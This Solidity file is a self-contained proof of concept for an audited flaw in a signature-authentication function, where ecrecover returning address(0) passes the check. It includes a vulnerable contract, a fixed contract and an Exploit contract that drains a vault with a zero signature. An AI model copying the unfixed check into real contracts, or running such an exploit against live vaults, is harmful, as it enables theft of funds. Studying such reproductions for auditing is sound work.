// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Term Finance — Authenticator.authenticate accepts ecrecover == address(0)
    (Sigma Prime, April 2023, TRM-07).
    SYNTHETIC, cheatcode-free. The audited authenticate body is copied verbatim.
    user = address(0) and a 65-byte zero signature make ecrecover return 0,
    so the check passes. The vault then sends 1,000 tokens to the caller.
    The control reverts when ecrecover returns address(0). */

struct TermAuth {
    address user;
    uint256 nonce;
    bytes signature;
}

interface IAuthenticator {
    function authenticate(TermAuth memory termAuth) external returns (bool);
}

contract Token {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Authenticator is IAuthenticator {
    mapping(uint256 => bool) public usedNonces;

    error NonceAlreadyUsed(uint256 nonce);

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "len");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }

    /// @notice Audited Authenticator.authenticate (line 100 of the report).
    function authenticate(TermAuth memory termAuth) public returns (bool) {
        if (usedNonces[termAuth.nonce]) {
            revert NonceAlreadyUsed(termAuth.nonce);
        }
        usedNonces[termAuth.nonce] = true;

        (uint8 v, bytes32 r, bytes32 s) = splitSignature(termAuth.signature);

        string memory header = "\x19Ethereum Signed Message:\n32";
        bytes32 check = keccak256(
            abi.encodePacked(header, keccak256(abi.encodePacked(termAuth.nonce, termAuth.user)))
        );
        // @> VULN: a zero ecrecover matches termAuth.user when that user is address(0)
        return ecrecover(check, v, r, s) == termAuth.user;
    }
}

contract AuthenticatorFixed is IAuthenticator {
    mapping(uint256 => bool) public usedNonces;

    error NonceAlreadyUsed(uint256 nonce);
    error InvalidSignature();

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "len");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }

    function authenticate(TermAuth memory termAuth) public returns (bool) {
        if (usedNonces[termAuth.nonce]) {
            revert NonceAlreadyUsed(termAuth.nonce);
        }
        usedNonces[termAuth.nonce] = true;

        (uint8 v, bytes32 r, bytes32 s) = splitSignature(termAuth.signature);

        string memory header = "\x19Ethereum Signed Message:\n32";
        bytes32 check = keccak256(
            abi.encodePacked(header, keccak256(abi.encodePacked(termAuth.nonce, termAuth.user)))
        );
        address recovered = ecrecover(check, v, r, s);
        if (recovered == address(0)) revert InvalidSignature();
        return recovered == termAuth.user;
    }
}

contract Vault {
    Token public token;
    IAuthenticator public auth;

    constructor(Token token_, IAuthenticator auth_) {
        token = token_;
        auth = auth_;
    }

    function withdraw(TermAuth memory termAuth, address to, uint256 amount) external {
        require(auth.authenticate(termAuth), "auth");
        token.transfer(to, amount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant AMOUNT = 1_000 ether;

    Token public token;
    Authenticator public auth;
    Vault public vault;
    uint256 public taken;

    function run() external {
        token = new Token(); // nonce 1
        auth = new Authenticator(); // nonce 2
        vault = new Vault(token, auth); // nonce 3

        token.mint(address(vault), AMOUNT);

        bytes memory sig = new bytes(65);
        TermAuth memory termAuth = TermAuth({user: address(0), nonce: 1, signature: sig});
        vault.withdraw(termAuth, ATTACKER, AMOUNT);

        taken = token.balanceOf(ATTACKER);
        require(taken == AMOUNT, "taken");
        require(token.balanceOf(address(vault)) == 0, "vault empty");
    }
}
